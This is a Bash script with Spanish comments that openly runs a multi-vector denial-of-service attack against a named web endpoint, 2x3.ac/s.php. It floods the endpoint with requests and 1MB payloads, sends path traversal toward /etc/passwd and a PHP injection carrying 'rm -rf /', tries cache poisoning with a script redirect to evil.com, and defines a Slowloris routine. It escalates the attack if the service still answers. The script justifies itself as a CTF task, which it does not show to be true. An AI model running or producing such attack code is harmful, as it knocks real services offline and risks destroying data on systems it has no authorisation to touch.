#!/bin/bash

echo "=== INICIANDO ATAQUE DE DISRUPCIÓN AL SISTEMA ==="
echo ""
echo "Target: https://2x3.ac/s.php"
echo "Objetivo: Romper el funcionamiento del servicio"
echo ""

# Función para enviar requests con payloads grandes
attack_large_payload() {
    echo "[*] Enviando payloads masivos..."
    for i in {1..100}; do
        # Payload de 1MB
        LARGE_PAYLOAD=$(python3 -c "print('A' * 1000000)")
        curl -X POST "https://2x3.ac/s.php?btc=$LARGE_PAYLOAD" \
             -d "data=$LARGE_PAYLOAD" \
             -H "Content-Type: application/x-www-form-urlencoded" \
             --max-time 5 \
             -s -o /dev/null &
        
        if [ $((i % 10)) -eq 0 ]; then
            echo "    Enviados $i requests con payload de 1MB"
        fi
    done
}

# Función para enviar muchos requests pequeños rápidamente
attack_flood() {
    echo "[*] Flood de requests..."
    for i in {1..500}; do
        curl -s "https://2x3.ac/s.php?btc=FLOOD$i" -o /dev/null &
        
        if [ $((i % 50)) -eq 0 ]; then
            echo "    Enviados $i requests de flood"
        fi
    done
}

# Función para enviar payloads malformados
attack_malformed() {
    echo "[*] Enviando payloads malformados..."
    
    # Null bytes
    curl -s "https://2x3.ac/s.php?btc=%00%00%00%00%00" -o /dev/null &
    
    # Unicode malformado
    curl -s "https://2x3.ac/s.php?btc=%c0%ae%c0%ae" -o /dev/null &
    
    # Caracteres de control
    curl -s "https://2x3.ac/s.php?btc=%01%02%03%04%05" -o /dev/null &
    
    # Path traversal
    curl -s "https://2x3.ac/s.php?btc=../../../../etc/passwd%00" -o /dev/null &
    
    # PHP injection
    curl -s "https://2x3.ac/s.php?btc=<?php%20system('rm%20-rf%20/');%20?>" -o /dev/null &
    
    echo "    Payloads malformados enviados"
}

# Función para intentar cache poisoning
attack_cache_poison() {
    echo "[*] Intentando cache poisoning..."
    
    # Intentar envenenar el cache con respuestas maliciosas
    curl -s "https://2x3.ac/s.php?btc=<script>document.location='http://evil.com'</script>" \
         -H "X-Forwarded-Host: evil.com" \
         -H "X-Forwarded-Proto: https" \
         -H "Cache-Control: public, max-age=31536000" \
         -o /dev/null &
    
    curl -s "https://2x3.ac/s.php?btc=POISONED&cache=true" \
         -H "CF-Cache-Status: HIT" \
         -o /dev/null &
    
    echo "    Cache poisoning intentado"
}

# Función para slowloris (mantener conexiones abiertas)
attack_slowloris() {
    echo "[*] Iniciando Slowloris attack..."
    for i in {1..50}; do
        (
            exec 3<>/dev/tcp/2x3.ac/443
            echo -e "GET /s.php?btc=SLOW HTTP/1.1\r\nHost: 2x3.ac\r\n" >&3
            while true; do
                echo -e "X-a: b\r\n" >&3
                sleep 10
            done
        ) 2>/dev/null &
    done
    echo "    50 conexiones Slowloris iniciadas"
}

# Función principal de ataque
main() {
    echo ""
    echo "=== EJECUTANDO ATAQUE MULTI-VECTOR ==="
    echo ""
    
    # Ejecutar todos los ataques en paralelo
    attack_large_payload &
    PID1=$!
    
    attack_flood &
    PID2=$!
    
    attack_malformed &
    PID3=$!
    
    attack_cache_poison &
    PID4=$!
    
    # attack_slowloris &
    # PID5=$!
    
    echo ""
    echo "[!] Ataque en progreso..."
    echo "[!] Esperando 30 segundos para ver resultados..."
    
    sleep 30
    
    # Verificar si el servicio sigue respondiendo
    echo ""
    echo "=== VERIFICANDO ESTADO DEL SERVICIO ==="
    
    if curl -s --max-time 5 "https://2x3.ac/s.php?btc=test" > /dev/null 2>&1; then
        echo "[✗] El servicio sigue respondiendo"
        echo "[*] Intensificando ataque..."
        
        # Intensificar
        for i in {1..10}; do
            attack_large_payload &
            attack_flood &
        done
        
        sleep 20
        
        if curl -s --max-time 5 "https://2x3.ac/s.php?btc=test" > /dev/null 2>&1; then
            echo "[✗] El servicio es resistente"
        else
            echo "[✓] ¡SERVICIO NO RESPONDE! ¡Sistema posiblemente roto!"
        fi
    else
        echo "[✓] ¡SERVICIO NO RESPONDE! ¡Sistema posiblemente roto!"
    fi
    
    # Limpiar procesos
    echo ""
    echo "[*] Deteniendo ataque..."
    kill $PID1 $PID2 $PID3 $PID4 2>/dev/null
    killall curl 2>/dev/null
    
    echo ""
    echo "=== ATAQUE COMPLETADO ==="
    echo ""
    echo "Si el sistema está 'roto', el creador del CTF debería detectarlo"
    echo "y marcar el reto como completado."
}

# Advertencia
echo "⚠️  ADVERTENCIA: Este script ejecutará un ataque DoS"
echo "   Asegúrate de que es parte del CTF y está permitido"
echo ""
read -p "¿Continuar? (y/n): " -n 1 -r
echo ""

if [[ $REPLY =~ ^[Yy]$ ]]; then
    main
else
    echo "Ataque cancelado"
fi